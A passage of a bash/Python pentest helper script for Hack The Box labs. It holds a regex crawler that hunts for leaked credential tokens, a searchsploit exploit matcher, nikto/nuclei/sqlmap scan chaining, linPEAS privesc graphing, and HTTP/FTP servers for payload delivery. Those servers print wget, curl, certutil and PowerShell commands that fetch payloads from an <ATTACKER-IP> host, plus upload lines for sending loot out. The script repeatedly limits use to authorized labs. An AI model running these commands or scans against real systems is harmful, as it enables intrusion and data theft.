    ("AWS secret key",     "CRITICAL", re.compile(r"(?i)aws.{0,20}?(?:secret|key).{0,4}['\"]([0-9a-zA-Z/+]{40})['\"]")),
    ("Google API key",     "HIGH",     re.compile(r"AIza[0-9A-Za-z_\-]{35}")),
    ("Slack token",        "HIGH",     re.compile(r"xox[baprs]-[0-9A-Za-z\-]{10,}")),
    ("GitHub token",       "HIGH",     re.compile(r"gh[pousr]_[0-9A-Za-z]{20,}")),
    ("JWT",                "HIGH",     re.compile(r"eyJ[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{6,}")),
    ("Bearer token",       "HIGH",     re.compile(r"(?i)bearer\s+[a-z0-9._\-]{12,}")),
    ("Basic-auth in URL",  "HIGH",     re.compile(r"https?://[^/\s:@]+:[^/\s:@]+@[^/\s]+")),
    ("Credential assignment","HIGH",   re.compile(r"(?i)['\"]?[A-Za-z0-9_\-]*(?:password|passwd|pwd|secret|api[_\-]?key|apikey|access[_\-]?token|auth[_\-]?token|client[_\-]?secret|token|private[_\-]?key)[A-Za-z0-9_\-]*['\"]?\s*[:=]\s*['\"]([^'\"]{3,80})['\"]")),
    ("Email address",      "INFO",     re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")),
]
COMMENT_RE = re.compile(r"<!--(.*?)-->", re.S)
COMMENT_KEYWORDS = re.compile(r"(?i)(pass|pwd|user|login|cred|secret|token|key|todo|fixme|backdoor|debug|admin)")
HIDDEN_RE = re.compile(r"<input[^>]*type=['\"]?hidden['\"]?[^>]*>", re.I)
VALUE_RE  = re.compile(r"value=['\"]([^'\"]+)['\"]", re.I)
NAME_RE   = re.compile(r"name=['\"]([^'\"]+)['\"]", re.I)
LINK_RE   = re.compile(r"(?:href|src)=['\"]([^'\"#]+)['\"]", re.I)

findings = []            # (severity, rule, url, snippet)
seen_find = set()        # dedupe on (rule, matched-string)

def add(sev, rule, url, matched, context):
    key = (rule, matched.strip()[:120])
    if key in seen_find:
        return
    seen_find.add(key)
    findings.append((sev, rule, url, matched.strip()[:120], context.strip()[:160]))

def scan_text(url, text):
    for name, sev, rx in RULES:
        for m in rx.finditer(text):
            matched = m.group(0)
            s = max(0, m.start() - 40); e = min(len(text), m.end() + 40)
            add(sev, name, url, matched, text[s:e].replace("\n", " "))
    # HTML comments that mention sensitive words
    for c in COMMENT_RE.finditer(text):
        body = c.group(1)
        if COMMENT_KEYWORDS.search(body):
            add("MEDIUM", "Suspicious HTML comment", url, body[:120], body[:160])
    # hidden form fields (often carry tokens/state)
    for h in HIDDEN_RE.finditer(text):
        tag = h.group(0)
        val = VALUE_RE.search(tag); nm = NAME_RE.search(tag)
        if val and len(val.group(1)) >= 6:
            label = nm.group(1) if nm else "?"
            add("LOW", "Hidden field value", url, f"{label}={val.group(1)}", tag[:160])

def same_host(u):
    try:
        n = urllib.parse.urlparse(u).netloc.lower()
    except Exception:
        return False
    if not n:
        return True
    n_nop = n.split(":")[0]
    return n in allowed_hosts or n_nop in allowed_hosts

def fetch(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
            hdrs = dict(r.headers.items())
            raw = r.read(1500000)
            enc = r.headers.get_content_charset() or "utf-8"
            return r.status, hdrs, raw.decode(enc, "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, dict(e.headers.items()), e.read().decode("utf-8", "replace")
        except Exception:
            return e.code, {}, ""
    except Exception:
        return None, {}, ""

# Build the seed queue.
queue = collections.deque()
seeded = set()
def enqueue(u, d):
    if u not in seeded and d <= DEPTH:
        seeded.add(u); queue.append((u, d))

for scheme in ("http", "https"):
    for h in (target, box_host):
        if h:
            for path in ("/", "/robots.txt", "/sitemap.xml"):
                enqueue(f"{scheme}://{h}{path}", 0)
if seedfile and os.path.exists(seedfile):
    with open(seedfile, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line.startswith("http") and same_host(line):
                enqueue(line, 0)

pages = 0
while queue and pages < MAX_PAGES:
    url, depth = queue.popleft()
    status, hdrs, body = fetch(url)
    if status is None:
        continue
    pages += 1
    # scan interesting response headers + cookies
    for hk in ("Set-Cookie", "Authorization", "X-Api-Key", "X-Auth-Token", "X-Powered-By"):
        if hk in hdrs:
            scan_text(url + f" [header:{hk}]", f"{hk}: {hdrs[hk]}")
    if not body:
        continue
    scan_text(url, body)
    # follow links / scripts on same host, within depth
    if depth < DEPTH:
        for m in LINK_RE.finditer(body):
            nxt = urllib.parse.urljoin(url, m.group(1))
            if nxt.startswith("http") and same_host(nxt):
                # prioritise js/json/txt/config (rich in secrets)
                enqueue(nxt, depth + 1)

# --- write report + print alerts -----------------------------------------
order = {"CRITICAL":0, "HIGH":1, "MEDIUM":2, "LOW":3, "INFO":4}
findings.sort(key=lambda x: order.get(x[0], 9))
counts = collections.Counter(f[0] for f in findings)

with open(outfile, "w", encoding="utf-8") as fo:
    fo.write(f"# Secret scan report for {target} ({box_host})\n")
    fo.write(f"# Pages crawled: {pages}   Findings: {len(findings)}\n")
    fo.write("# Authorized targets only. Review each hit — regex matches can be false positives.\n\n")
    if not findings:
        fo.write("No secrets detected. Try a deeper crawl (SECRETS_DEPTH=3) or run after AutoRecon finds more URLs.\n")
    for sev, rule, url, matched, ctxs in findings:
        fo.write(f"[{sev}] {rule}\n   url:     {url}\n   match:   {matched}\n   context: {ctxs}\n\n")

# console summary
def cprint(sev, msg):
    color = {"CRITICAL":"1;31","HIGH":"1;31","MEDIUM":"1;33","LOW":"1;34","INFO":"1;34"}.get(sev,"0")
    sys.stderr.write(f"\033[{color}m[{sev}]\033[0m {msg}\n")

if findings:
    cprint("HIGH", f"{len(findings)} potential secret(s) across {pages} page(s): "
                   + ", ".join(f"{c} {s.lower()}" for s, c in counts.most_common()))
    for sev, rule, url, matched, _ in findings[:12]:
        cprint(sev, f"{rule}: {matched}  ({url})")
    if len(findings) > 12:
        sys.stderr.write(f"    ... and {len(findings)-12} more — see the report.\n")
else:
    sys.stderr.write("[*] No secrets detected on the pages crawled.\n")
PY
  local rc=$?
  rm -f "$seeds"
  if [[ $rc -eq 0 ]]; then
    c_ok "Secret scan complete -> $out"
  else
    c_warn "Secret scan exited with code $rc (partial results may be in $out)"
  fi
  return 0
}

# ---------------------------------------------------------------------------
# exploits — map fingerprinted services to known exploits via searchsploit
# ---------------------------------------------------------------------------
# Parses the nmap XML produced by AutoRecon (and the built-in recon), extracts
# each service's product + version, and queries the local Exploit-DB (offline)
# for known exploits, mapping results back to the port/service.
cmd_exploits() {
  local box="${1:-target}"
  local dir="${HTB_ROOT}/${box}"
  if ! have searchsploit; then
    c_warn "searchsploit (exploitdb) not installed — skipping exploit lookup."
    c_info "Install it:  sudo apt install exploitdb   (or re-run './boxer.sh install')"
    return 0
  fi
  if ! have python3; then c_warn "python3 missing — skipping exploit lookup."; return 0; fi

  # Collect nmap XML output from AutoRecon and our own recon.
  local xmls=()
  while IFS= read -r x; do [[ -n "$x" ]] && xmls+=("$x"); done \
    < <(find "$dir/autorecon" "$dir/nmap" -type f -name '*.xml' 2>/dev/null)
  if [[ ${#xmls[@]} -eq 0 ]]; then
    c_warn "No nmap XML found in $dir — run recon/autorecon first."; return 0
  fi

  local out="$dir/exploits-report.txt"
  c_info "Matching fingerprinted services to known exploits (offline Exploit-DB) -> $out"

  python3 - "$out" "${xmls[@]}" <<'PY'
import sys, os, json, subprocess, re
import xml.etree.ElementTree as ET

outfile = sys.argv[1]
xml_files = sys.argv[2:]

# Gather unique services from all nmap XMLs: (port, proto, product, version, extrainfo)
services = {}
for xf in xml_files:
    try:
        root = ET.parse(xf).getroot()
    except Exception:
        continue
    for host in root.iter("host"):
        for port in host.iter("port"):
            portid = port.get("portid", "?")
            proto  = port.get("protocol", "tcp")
            st = port.find("state")
            if st is not None and st.get("state") != "open":
                continue
            svc = port.find("service")
            if svc is None:
                continue
            product = (svc.get("product") or "").strip()
            version = (svc.get("version") or "").strip()
            name    = (svc.get("name") or "").strip()
            if not product:
                continue   # nothing to fingerprint an exploit from
            key = (portid, proto, product, version)
            services[key] = name

def ss_query(q):
    """Run searchsploit -j for a query, return list of exploit dicts."""
    try:
        p = subprocess.run(["searchsploit", "-j", q], capture_output=True,
                           text=True, timeout=40)
        data = json.loads(p.stdout or "{}")
        return data.get("RESULTS_EXPLOIT", []) or []
    except Exception:
        return []

def build_queries(product, version):
    qs = []
    if version:
        qs.append(f"{product} {version}")
        # also major.minor (e.g. 2.4.49 -> 2.4) to catch version-range exploits
        m = re.match(r"(\d+\.\d+)", version)
        if m and m.group(1) != version:
            qs.append(f"{product} {m.group(1)}")
    qs.append(product)   # product-only as a broad fallback
    # de-dupe preserving order
    seen, uniq = set(), []
    for q in qs:
        if q.lower() not in seen:
            seen.add(q.lower()); uniq.append(q)
    return uniq

# Title keywords that indicate remote code / command execution (highest priority leads).
RCE_RE = re.compile(r"(?i)\b(rce|remote code execution|command execution|command injection|"
                    r"unauthenticated|arbitrary (code|command)|code exec)\b")

report_blocks = []
alert_lines = []
total = 0
rce_total = 0

for (portid, proto, product, version), name in sorted(services.items(), key=lambda k: int(k[0][0]) if k[0][0].isdigit() else 0):
    hits, seen_ids = [], set()
    for q in build_queries(product, version):
        for e in ss_query(q):
            eid = str(e.get("EDB-ID", ""))
            if eid and eid in seen_ids:
                continue
            seen_ids.add(eid)
            hits.append((eid, e.get("Title", "").strip(), e.get("Path", "").strip()))
        if hits:   # stop at the most specific query that returned something
            break
    label = f"{portid}/{proto}  {product} {version}".rstrip() + (f"  ({name})" if name else "")
    if hits:
        total += len(hits)
        # Sort RCE-looking exploits to the top of each service block.
        hits.sort(key=lambda h: 0 if RCE_RE.search(h[1]) else 1)
        block = [f"=== {label} ===  {len(hits)} exploit(s)"]
        for eid, title, path in hits[:25]:
            tag = "  [RCE?]" if RCE_RE.search(title) else ""
            if tag:
                rce_total += 1
            block.append(f"   EDB-{eid}: {title}{tag}")
            block.append(f"      view: searchsploit -x {eid}   copy: searchsploit -m {eid}")
        report_blocks.append("\n".join(block))
        alert_lines.append(f"{label}: {len(hits)} known exploit(s) (e.g. EDB-{hits[0][0]}: {hits[0][1][:70]})")
    else:
        report_blocks.append(f"=== {label} ===  no known Exploit-DB entries")

with open(outfile, "w", encoding="utf-8") as fo:
    fo.write("# Exploit matches for fingerprinted services (offline Exploit-DB / searchsploit)\n")
    fo.write(f"# Services analysed: {len(services)}   Total matches: {total}   Possible RCE: {rce_total}\n")
    fo.write("#\n")
    fo.write("# [RCE?] tags flag titles that mention remote code/command execution — the\n")
    fo.write("# highest-value leads, but a version match is NOT proof of vulnerability.\n")
    fo.write("# Workflow (keep yourself in the loop — never run an exploit unread):\n")
    fo.write("#   1) READ it:     searchsploit -x <EDB-ID>\n")
    fo.write("#   2) COPY it:     searchsploit -m <EDB-ID>   (lands in your cwd)\n")
    fo.write("#   3) VALIDATE safely: if a Metasploit module exists, its 'check' command tests\n")
    fo.write("#      whether the target is vulnerable WITHOUT exploiting it:\n")
    fo.write("#        msfconsole -q -x \"search <product>; use <module>; set RHOSTS <ip>; check\"\n\n")
    fo.write("\n\n".join(report_blocks) if report_blocks else "No fingerprinted services with a product/version found.\n")

def cprint(color, msg): sys.stderr.write(f"\033[{color}m{msg}\033[0m\n")
if total:
    cprint("1;31", f"[!] {total} known exploit match(es) across {len(services)} service(s)"
                   + (f"; {rce_total} look like RCE" if rce_total else "") + ":")
    for line in alert_lines:
        if "known exploit" in line:
            sys.stderr.write(f"    - {line}\n")
    sys.stderr.write("    Review before running: 'searchsploit -x <id>'. For a safe vuln test, use a Metasploit module's 'check'.\n")
else:
    sys.stderr.write("[*] No known Exploit-DB matches for the fingerprinted services.\n")
PY
  local rc=$?
  if [[ $rc -eq 0 ]]; then c_ok "Exploit lookup complete -> $out"; else c_warn "Exploit lookup exited $rc (partial results may be in $out)"; fi
  return 0
}

# ---------------------------------------------------------------------------
# webscan — chain nikto + nuclei + sqlmap for web vulnerability scanning
# ---------------------------------------------------------------------------
# Covers the same ground as Burp Suite's active scanner (free, fully CLI).
# nikto   : generic web server misconfigs, outdated software, dangerous files.
# nuclei  : template-driven CVE + misconfiguration + exposure scanning.
#           Uses -automatic-scan (wappalyzer tech detection) so it picks the
#           right templates for the stack it detects (PHP, Apache, IIS, etc.).
# sqlmap  : optional SQL-injection sweep (prompted — can be noisy).
# Only run against authorized targets (HTB labs / your own systems).
cmd_webscan() {
  local target="${1:-}"; local box="${2:-target}"
  if [[ -z "$target" ]]; then c_err "Usage: $0 webscan <target-ip-or-url> [box-name]"; exit 1; fi

  local dir="${HTB_ROOT}/${box}"; mkdir -p "$dir"
  local out="$dir/webscan"; mkdir -p "$out"

  # Build a base URL if a bare IP/host was given.
  local base_url
  if [[ "$target" =~ ^https?:// ]]; then
    base_url="$target"
  else
    base_url="http://${target}"
  fi

  c_warn "Only scan systems you are authorized to test (HTB labs / your own systems)."
  c_info "Web vulnerability scan: $base_url  ->  $out"
  echo

  # ------------------------------------------------------------------
  # 1) nikto — fast web-server audit (misconfigs, headers, known bugs)
  # ------------------------------------------------------------------
  if have nikto; then
    c_info "▶ Stage 1: nikto web-server scan..."
    nikto -host "$base_url" -output "$out/nikto.txt" -Format txt 2>&1 | tee "$out/nikto-live.txt" || true
    c_ok "nikto -> $out/nikto.txt"
    # Show any critical-sounding hits inline.
    grep -iE '(OSVDB|CVE|XSS|SQL|traversal|upload|backdoor|admin|config|cgi)' "$out/nikto.txt" 2>/dev/null \
      | head -20 | while IFS= read -r l; do c_warn "$l"; done || true
  else
    c_warn "nikto not installed — skipping. (Run './boxer.sh install' or 'sudo apt install nikto')"
  fi
  echo

  # ------------------------------------------------------------------
  # 2) nuclei — template-driven CVE / misconfiguration / exposure scan
  # ------------------------------------------------------------------
  if have nuclei; then
    c_info "▶ Stage 2: nuclei automatic scan (wappalyzer tech-detect + matched templates)..."
    c_info "  First run auto-downloads templates (~100 MB) — may take a moment."
    # -automatic-scan: detects tech via wappalyzer, selects relevant templates.
    # -severity: only alert on medium/high/critical to cut noise.
    # -silent:   suppresses banner; raw findings go to -o.
    nuclei -u "$base_url" \
           -automatic-scan \
           -severity medium,high,critical \
           -o "$out/nuclei.txt" \
           -silent 2>/dev/null || \
    # Fallback: if -automatic-scan not supported (older nuclei), use tag filter.
    nuclei -u "$base_url" \
           -tags cve,rce,sqli,xss,lfi,ssrf,exposure,misconfig \
           -severity medium,high,critical \
           -o "$out/nuclei.txt" \
           -silent 2>/dev/null || true
    if [[ -s "$out/nuclei.txt" ]]; then
      local nc; nc=$(wc -l < "$out/nuclei.txt" | tr -d ' ')
      c_ok "nuclei -> $out/nuclei.txt  ($nc finding(s))"
      head -25 "$out/nuclei.txt"
    else
      c_info "nuclei: no medium/high/critical findings on $base_url."
    fi
  else
    c_warn "nuclei not installed — skipping."
    c_info "Install: sudo apt install nuclei"
    c_info "  OR:    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    c_info "  (nuclei is available in ParrotOS/Kali repos; may need 'sudo apt update' first)"
  fi
  echo

  # ------------------------------------------------------------------
  # 3) sqlmap — SQL injection sweep (optional, user-prompted)
  # ------------------------------------------------------------------
  local sqsel
  ask sqsel "Run sqlmap against $base_url? (crawls for SQLi — can be noisy) [y/N]: "
  if [[ "${sqsel:-n}" =~ ^[Yy] ]]; then
    if have sqlmap; then
      c_info "▶ Stage 3: sqlmap SQL-injection sweep (crawl=3, level=2, risk=1, batch)..."
      mkdir -p "$out/sqlmap"
      sqlmap -u "$base_url" \
             --crawl=3 \
             --batch \
             --level=2 \
             --risk=1 \
             --output-dir="$out/sqlmap" \
             2>&1 | tee "$out/sqlmap-live.txt" || true
      c_ok "sqlmap -> $out/sqlmap/"
      # Surface any injectable parameters found.
      grep -iE '(injectable|VULNERABLE|payload)' "$out/sqlmap-live.txt" 2>/dev/null \
        | head -15 | while IFS= read -r l; do c_warn "$l"; done || true
    else
      c_warn "sqlmap not installed — skipping. (Run './boxer.sh install' or 'sudo apt install sqlmap')"
    fi
  fi
  echo

  # ------------------------------------------------------------------
  # Summary
  # ------------------------------------------------------------------
  c_ok "Web scan complete. Results in: $out"
  have nikto   && c_info "  nikto:  $out/nikto.txt"
  have nuclei  && c_info "  nuclei: $out/nuclei.txt"
  [[ "${sqsel:-n}" =~ ^[Yy] ]] && c_info "  sqlmap: $out/sqlmap/"
  c_info "Tip: combine with './boxer.sh secrets $target $box' to also hunt for leaked creds/tokens."
  return 0
}

# ---------------------------------------------------------------------------
# roothound — feed linPEAS output to RootHound and build the privesc graph
# ---------------------------------------------------------------------------
# Locate the RootHound entrypoint from the cloned tools dir.
find_roothound() {
  local c
  for c in "$TOOLS_DIR/RootHound/RootHound.py" "$TOOLS_DIR/RootHound/roothound.py"; do
    [[ -f "$c" ]] && { echo "$c"; return 0; }
  done
  return 1
}

# Run RootHound on a single linPEAS output file -> report.html in the workspace.
run_roothound_on() {
  local infile="$1" dir="$2"
  local rh; rh="$(find_roothound)" || {
    c_err "RootHound not found. Install it:  ./boxer.sh tools https://github.com/Noz2/RootHound"
    return 1
  }
  [[ -s "$infile" ]] || { c_warn "linPEAS file empty/missing: $infile"; return 1; }
  local report="$dir/roothound-report.html"
  c_info "Feeding $(basename "$infile") to RootHound..."
  if python3 "$rh" "$infile" -o "$report" >/dev/null 2>&1; then
    c_ok "Privesc graph ready: $report"
    have xdg-open && xdg-open "$report" >/dev/null 2>&1 &
    return 0
  else
    c_warn "RootHound errored on $infile — run manually: python3 $rh $infile -o $report"
    return 1
  fi
}

# Detect whether a text file actually looks like linPEAS output.
is_linpeas_output() {
  grep -qiE 'linpeas|PEASS|Basic information|Interesting Files|SUID' "$1" 2>/dev/null
}

# Handle a single candidate file: if it's linPEAS output and not yet processed,
# run RootHound and drop the report into that file's own box directory.
# The box dir is derived from the path: <HTB_ROOT>/<box>/loot/<file> -> <box> dir.
roothound_handle_file() {
  local f="$1" processed="$2"
  [[ -e "$f" ]] || return 0
  grep -qxF "$f" "$processed" 2>/dev/null && return 0
  is_linpeas_output "$f" || return 0
  local box_dir; box_dir="$(cd "$(dirname "$f")/.." && pwd)"   # parent of loot/
  c_ok "Detected linPEAS output: $f"
  run_roothound_on "$f" "$box_dir" && echo "$f" >> "$processed"
}

cmd_roothound() {
  if ! have python3; then c_err "python3 not installed. Run './boxer.sh install'."; exit 1; fi
  find_roothound >/dev/null || { c_err "RootHound missing. Run:  ./boxer.sh tools https://github.com/Noz2/RootHound"; exit 1; }

  local arg1="${1:-}"; local given="${2:-}"

  # One-shot mode: 'roothound <box> <file>' OR 'roothound <file>' (any path).
  if [[ -n "$given" ]]; then
    run_roothound_on "$given" "${HTB_ROOT}/${arg1}"; return $?
  fi
  if [[ -n "$arg1" && -f "$arg1" ]]; then
    # A file path was passed directly; report next to it.
    run_roothound_on "$arg1" "$(cd "$(dirname "$arg1")" && pwd)"; return $?
  fi

  # Determine watch scope.
  local watch_root scope_desc
  if [[ -n "$arg1" ]]; then
    # Specific box.
    mkdir -p "${HTB_ROOT}/${arg1}/loot"
    watch_root="${HTB_ROOT}/${arg1}"
    scope_desc="box '${arg1}' (${watch_root}/loot)"
  else
    # ALL boxes under HTB_ROOT.
    mkdir -p "$HTB_ROOT"
    watch_root="$HTB_ROOT"
    scope_desc="ALL boxes under ${HTB_ROOT} (any */loot)"
  fi

  local processed="${HTB_ROOT}/.roothound_done"; touch "$processed"
  c_info "Watching ${scope_desc} for uploaded linPEAS output (Ctrl-C to stop)."
  c_info "Upload from a target with e.g.:  scp linpeas.txt you@ATTACKER:${HTB_ROOT}/<box>/loot/"
  [[ -z "$arg1" ]] && c_info "New box workspaces are picked up automatically."

  # Scan every loot/ dir in scope for candidate files.
  scan_all_loot() {
    local d f
    while IFS= read -r d; do
      for f in "$d"/*.txt "$d"/*.log "$d"/*.out; do
        [[ -e "$f" ]] || continue
        roothound_handle_file "$f" "$processed" || true
      done
    done < <(find "$watch_root" -type d -name loot 2>/dev/null)
    return 0   # never let an empty glob / non-match abort under 'set -e'
  }

  scan_all_loot   # process anything already present
  if have inotifywait; then
    # Event-driven, recursive: fires on any file written/moved anywhere in scope.
    # We re-scan loot dirs on each event (cheap) so newly-created boxes are covered.
    while inotifywait -q -r -e close_write -e moved_to -e create "$watch_root" >/dev/null 2>&1; do
      scan_all_loot
    done
  else
    c_info "(install inotify-tools for instant detection; polling every 5s)"
    while :; do sleep 5; scan_all_loot; done
  fi
}

# ---------------------------------------------------------------------------
# resolve_bind — turn a bind spec (auto|all|<iface>|<ip>) into IPs
# ---------------------------------------------------------------------------
# Prints "<bind_ip>\t<display_ip>". bind_ip empty => bind all interfaces.
resolve_bind() {
  local spec="$1" bind_ip="" disp=""
  case "$spec" in
    all|0.0.0.0) bind_ip="" ;;
    auto)
      bind_ip="$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -n1 || true)"
      [[ -z "$bind_ip" ]] && bind_ip="$(hostname -I 2>/dev/null | awk '{print $1}' || true)" ;;
    *[0-9].[0-9]*.*.*) bind_ip="$spec" ;;
    *) bind_ip="$(ip -4 addr show "$spec" 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -n1 || true)" ;;
  esac
  disp="$bind_ip"; [[ -z "$disp" ]] && disp="$(hostname -I 2>/dev/null | awk '{print $1}' || true)"
  printf '%s\t%s\n' "$bind_ip" "$disp"
}

# ---------------------------------------------------------------------------
# http — simple HTTP file server (use when the box blocks outbound FTP)
# ---------------------------------------------------------------------------
# Serves the delivery folder (default ~/htb/serve) over HTTP so a foothold shell
# can pull tools with wget/curl/certutil/PowerShell. Same bind options as ftp.
cmd_http() {
  local dir="${1:-$HTB_ROOT/serve}"; local port="${2:-80}"
  local bind_spec="${3:-${HTTP_BIND:-${FTP_BIND:-auto}}}"
  if ! have python3; then c_err "python3 not installed. Run './boxer.sh install'."; exit 1; fi

  mkdir -p "$dir"; dir="$(cd "$dir" && pwd)"

  local res bind_ip atk
  res="$(resolve_bind "$bind_spec")"; bind_ip="${res%%$'\t'*}"; atk="${res##*$'\t'}"
  local addr bind_disp
  if [[ "$bind_spec" == "all" || "$bind_spec" == "0.0.0.0" ]]; then
    addr="0.0.0.0"; bind_disp="0.0.0.0 (all interfaces)"
  elif [[ -n "$bind_ip" ]]; then
    addr="$bind_ip"; bind_disp="$bind_ip"
  else
    addr="0.0.0.0"; bind_disp="0.0.0.0 (all interfaces)"
    [[ "$bind_spec" == "auto" ]] && c_warn "auto: no tun0/host IP found — binding all interfaces." \
                                 || c_warn "Could not resolve '$bind_spec' — binding all interfaces."
  fi

  local ifaces; ifaces="$(ip -4 -o addr show 2>/dev/null | awk '{print $2"="$4}' | paste -sd' ' - || true)"
  c_warn "Only serve payloads to systems you are authorized to test, and stop it when done."
  c_info "Available interfaces: ${ifaces:-none detected}"
  c_info "Serving (HTTP): $dir"
  c_info "URL base: http://${atk:-<ATTACKER-IP>}:$port/   Bind: ${bind_disp}:$port"
  echo
  c_info "Drop payloads/tools into: $dir, then from the box:"
  cat <<EOF
    # Linux target:
    wget http://${atk:-<ATTACKER-IP>}:${port}/<file> -O /tmp/<file>
    curl -o /tmp/<file> http://${atk:-<ATTACKER-IP>}:${port}/<file>

    # Windows target (PowerShell):
    (New-Object Net.WebClient).DownloadFile('http://${atk:-<ATTACKER-IP>}:${port}/<file>','C:\\Windows\\Temp\\<file>')
    iwr http://${atk:-<ATTACKER-IP>}:${port}/<file> -OutFile C:\\Windows\\Temp\\<file>

    # Windows target (certutil, no PowerShell needed):
    certutil -urlcache -split -f http://${atk:-<ATTACKER-IP>}:${port}/<file> <file>
EOF
  echo
  c_info "Starting HTTP server on ${addr}:${port} (Ctrl-C to stop)..."

  local runner=(python3 -m http.server "$port" --bind "$addr" --directory "$dir")
  if [[ "$port" -lt 1024 && $EUID -ne 0 ]] && have sudo; then
    exec sudo "${runner[@]}"
  else
    exec "${runner[@]}"
  fi
}

# ---------------------------------------------------------------------------
# ftp — anonymous FTP server on the attacking host (tool delivery / pickup)
# ---------------------------------------------------------------------------
# Serves a directory over anonymous FTP so a foothold shell on the box can pull
# your executables/scripts. Read-only by default; set FTP_WRITE=1 to also allow
# the target to upload (handy for exfil).
#
# Bind selection (3rd arg or $FTP_BIND), useful because on the HTB ParrotOS
# Pwnbox the route to the target isn't always tun0:
#   auto    (default) tun0 if present, else the primary host IP
#   all     bind every interface (0.0.0.0)
#   <iface> bind a named interface's IP  (e.g. eth0, tun0, ens160)
#   <ip>    bind an explicit IP address
cmd_ftp() {
  local dir="${1:-$HTB_ROOT/serve}"; local port="${2:-21}"
  local bind_spec="${3:-${FTP_BIND:-auto}}"
  if ! have python3; then c_err "python3 not installed. Run './boxer.sh install'."; exit 1; fi
  if ! python3 -c 'import pyftpdlib' >/dev/null 2>&1; then
    c_err "pyftpdlib not installed."
    c_info "Install it:  pip3 install --break-system-packages pyftpdlib   (or './boxer.sh install')"
    exit 1
  fi

  mkdir -p "$dir"
  dir="$(cd "$dir" && pwd)"   # absolute

  # Resolve the bind spec to a concrete IP (bind_ip) and a display IP (atk).
  # bind_ip empty => bind all interfaces. (|| true keeps 'set -o pipefail' happy.)
  local bind_ip="" atk=""
  case "$bind_spec" in
    all|0.0.0.0)
      bind_ip="" ;;
    auto)
      bind_ip="$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -n1 || true)"
      [[ -z "$bind_ip" ]] && bind_ip="$(hostname -I 2>/dev/null | awk '{print $1}' || true)" ;;
    *[0-9].[0-9]*.*.*)
      bind_ip="$bind_spec" ;;                       # looks like an IP
    *)
      bind_ip="$(ip -4 addr show "$bind_spec" 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -n1 || true)"
      [[ -z "$bind_ip" ]] && c_warn "Interface '$bind_spec' has no IPv4 / not found." ;;
  esac
  # Display IP for the pickup commands (fall back to any host IP).
  atk="$bind_ip"
  [[ -z "$atk" ]] && atk="$(hostname -I 2>/dev/null | awk '{print $1}' || true)"

  # Write access?
  local wflag=() mode="READ-ONLY"
  if [[ "${FTP_WRITE:-0}" == "1" ]]; then wflag=(-w); mode="READ-WRITE (uploads allowed)"; fi

  # Build the interface flag.
  local iflag=() bind_disp
  if [[ "$bind_spec" == "all" || "$bind_spec" == "0.0.0.0" ]]; then
    iflag=(); bind_disp="0.0.0.0 (all interfaces)"
  elif [[ -n "$bind_ip" ]]; then
    iflag=(-i "$bind_ip"); bind_disp="$bind_ip"
  else
    iflag=(); bind_disp="0.0.0.0 (all interfaces)"
    [[ "$bind_spec" == "auto" ]] && c_warn "auto: no tun0 or host IP found — binding all interfaces." \
                                 || c_warn "Binding all interfaces."
  fi

  local ifaces
  ifaces="$(ip -4 -o addr show 2>/dev/null | awk '{print $2"="$4}' | paste -sd' ' - || true)"
  c_warn "Anonymous FTP is unauthenticated. Only run it on an authorized engagement, and stop it when done."
  c_info "Available interfaces: ${ifaces:-none detected}"
  c_info "Serving:  $dir"
  c_info "Access:   anonymous / <blank>   Mode: $mode   Bind: ${bind_disp}:$port"
  echo
  c_info "Drop your payloads/tools into: $dir"
  c_info "Then, from the foothold shell on the box, pick them up:"
  cat <<EOF
    # Linux target (non-interactive):
    wget ftp://${atk:-<ATTACKER-IP>}/<file> -O /tmp/<file>
    curl -O ftp://${atk:-<ATTACKER-IP>}:${port}/<file>

    # Windows target (PowerShell):
    (New-Object Net.WebClient).DownloadFile('ftp://${atk:-<ATTACKER-IP>}/<file>','C:\\Windows\\Temp\\<file>')

    # Windows target (scripted ftp.exe):
    echo open ${atk:-<ATTACKER-IP>} ${port}> ftp.txt & echo anonymous>> ftp.txt & echo pass>> ftp.txt & echo binary>> ftp.txt & echo get <file>>> ftp.txt & echo bye>> ftp.txt & ftp -n -s:ftp.txt
EOF
  [[ "${FTP_WRITE:-0}" == "1" ]] && cat <<EOF
    # Upload FROM the box back to you (write mode):
    wget --method=PUT --body-file=/path/loot ftp://${atk:-<ATTACKER-IP>}/loot   # or use curl -T
    curl -T /path/loot ftp://${atk:-<ATTACKER-IP>}/loot
EOF
  echo
  c_info "Starting FTP server on port $port (Ctrl-C to stop)..."

  # Ports < 1024 need root.
  local runner=(python3 -m pyftpdlib -p "$port" -d "$dir" "${iflag[@]}" "${wflag[@]}")
  if [[ "$port" -lt 1024 && $EUID -ne 0 ]] && have sudo; then
    exec sudo "${runner[@]}"
  else
    exec "${runner[@]}"
  fi
}

# ---------------------------------------------------------------------------
# flags — stage the user.txt/root.txt finder scripts for delivery to the box
# ---------------------------------------------------------------------------
# Writes find-flags.sh (Linux) and find-flags.ps1 (Windows) into the delivery
# folder (default ~/htb/serve). Run them ON the target after you get a shell.
cmd_flags() {
  local dest="${1:-$HTB_ROOT/serve}"; mkdir -p "$dest"

  # Linux variant.
  cat > "$dest/find-flags.sh" <<'SH'
#!/usr/bin/env bash
# find-flags.sh — locate HTB flag files (user.txt/root.txt) on a Linux target.
# Authorized testing only. Usage: ./find-flags.sh [dir ...]
set -u
FLAG_NAMES=(user.txt root.txt proof.txt)
if [[ $# -gt 0 ]]; then ROOTS=("$@"); else ROOTS=(/home /root /Users /var /opt /srv /tmp /); fi
printf '[*] find-flags: searching for %s\n' "${FLAG_NAMES[*]}"
name_expr=()
for i in "${!FLAG_NAMES[@]}"; do
  [[ $i -eq 0 ]] && name_expr+=(-name "${FLAG_NAMES[$i]}") || name_expr+=(-o -name "${FLAG_NAMES[$i]}")
done
seen=""; found=0
for root in "${ROOTS[@]}"; do
  [[ -d "$root" ]] || continue
  while IFS= read -r f; do
